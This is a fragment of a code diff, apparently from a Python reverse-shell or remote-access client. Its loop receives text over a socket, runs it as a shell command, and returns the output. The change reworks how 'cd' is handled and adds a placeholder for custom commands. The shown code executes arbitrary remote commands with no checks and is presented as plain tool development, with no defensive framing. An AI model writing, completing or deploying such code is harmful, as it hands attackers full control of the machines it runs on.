@@ -40,7 +40,10 @@ def Cont():
                 msg = client.recv(2048).decode()
                 output = sp.getoutput(msg)
                 if msg.startswith('cd') and msg != 'cd':
-                    os.system(msg)
+                    os.chdir(msg.split(' ')[1])
+                elif msg.split(' ')[0] in commands:
+                    pass
+                    #TODO COMMANDS
                 else:
                     client.send(output.encode())
             except:
